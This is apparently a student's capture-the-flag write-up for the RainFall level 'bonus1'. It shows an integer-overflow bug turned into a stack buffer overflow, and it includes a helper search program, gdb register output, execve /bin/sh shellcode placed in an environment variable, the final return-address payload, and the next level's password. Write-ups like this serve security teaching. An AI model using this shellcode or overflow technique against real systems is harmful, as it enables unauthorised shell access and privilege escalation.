# bonus1

### First analysis

Rhis level has a very straightforward, short and easy to understand code:

```c
int main(int ac, char **av) {
    char    dest[40];
    int     size;

    size = atoi(av[1]);

    if (size < 10) {
        memcpy(dest, av[2], size * 4);
        if (size == 1464814662)
            execl("/bin/sh", "sh", 0);

    } else {
        return 1;
    }

    return 0;
}
```

It basically takes av[1] and stores it as the size of our input which can maximum be 9 * 4, so 36, and takes av[2] to write it into a 40 char size buffer.

So in this code the maximum char we can enter is 36, and the buffer is a 40 characters long buffer, so at first glance there are no overflows possible. However we worked a lot with atoi during our early days at 42, and knows some of its weird behavior such as, in 32bit, if we get to a too high value, and we continue to increment it, it would become negative, same thing if a very low number is decremented, it would become positive again. These limits are INT_MIN and INT_MAX. Those behaviors are actually not from atoi but just 32bit architecture, it's just that we observed it for the first time with atoi and itoa.

### Exploit atoi

So in theory if we input a negative number that is sufficiently low that if multiplied by 4 it would go under INT_MIN, we could get a positive payload. But more than that, we could control the size of our payload without paying attention to the limit of the buffer, therefore overflowing this buffer. We made for that a little script that can find the size of the buffer we want:

```c
int main(int ac, char **av) {
    int nbr = atoi(av[1]);

    printf("Searching for the closest buffer size for: %d\n", nbr);
    for (int i = -536870912; i > -2147483648; i--) {
        if (i * 4 <= nbr && i * 4 + 5 > nbr + 1)
            printf("Buffer x*4 of size: %d with x = %d\n", i * 4, i);
    }
}
```
Basically it tests every options possible between -536870912 which is INT_MIN divided by 4 (since here our size will be multiplied by 4 and that under this number, it would not result into a positive buffer), and INT_MIN, it will multiply by 4 every possibility and give the ones closest to the buffer we want. For example with a size of 100 or 110:

```sh
bonus1@RainFall:/tmp$ ./a.out 100
Searching for the closest buffer size for: 100
Buffer x*4 of size: 100 with x = -1073741799
Buffer x*4 of size: 100 with x = -2147483623
Searching for the closest buffer size for: 110
Buffer x*4 of size: 108 with x = -1073741797
Buffer x*4 of size: 108 with x = -2147483621
```

Since the buffer size will be a multiple of 4, 100 gives us a buffer size of 108, the closest size available.

### Exploit the rest

As we do all the time during the informations gathering part of exploiting a binary, now that we have a way to provoke a buffer overflow, we are gonna search for all the things that we manage to overflow such as addresses, variables etc... Here we would be interested in being able to modify size since the program gives us a nice shell if size = 1464814662.

After trying a lot of different payload of different sizes at different places, we dounf two spaces where we can edit informations:

```sh
(gdb) run -1073741794 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/bonus1/bonus1 -1073741794 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
[...]
0x6f6f6f6f in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0x68736162	1752392034
edx            0xbffff6fc	-1073744132
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6c0	0xbffff6c0
ebp            0x6e6e6e6e	0x6e6e6e6e
esi            0x0	0
edi            0x0	0
eip            0x6f6f6f6f	0x6f6f6f6f
eflags         0x200202	[ IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

Program received signal SIGSEGV, Segmentation fault.
0x6f6f6f6f in ?? ()
```

- 52 chars after our buffer address we seem to have edited ebp, which is now at 0x6e6e6e6e, so "nnnn" in hexadecimal.
- 56 chars after our buffer address, we seem to have edited the return value of main, which is now at 0x6f6f6f6f, so "oooo" in hexadecimal.

Even if with this first range of tests we didn't find where size is stored and how to edit it, we are capable of editing the return address of main. We then instantly thought, if we can edit it, maybe we can do the same as bonus0, put a shellcode in an env variable, get the address of this env variable with a little script, and redirect main to this shellcode. It doesn't seem to be the way the person who made this exercice wanted us to resolve it, but it is worth the try:

```sh
bonus1@RainFall:~$ export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
bonus1@RainFall:~$ /tmp/a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xbffff719
Lil-endian format: \x19\xf7\xff\xbf
```

We have our shellcode address (we used the env_address code of bonus0 that you can also find in Resources of bonus 1). We already had our program to know what number to input for a buffer of 100.
We just have to build our payload now:

```sh
bonus1@RainFall:~$ ./bonus1 -1073741799 $(python -c "print 'A' * 56 + '\x19\xf7\xff\xbf'")
$ whoami
bonus2
$ cat /home/user/bonus2/.pass 
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

As we said it is probably not the intended way of exploiting this binary but... it worked.
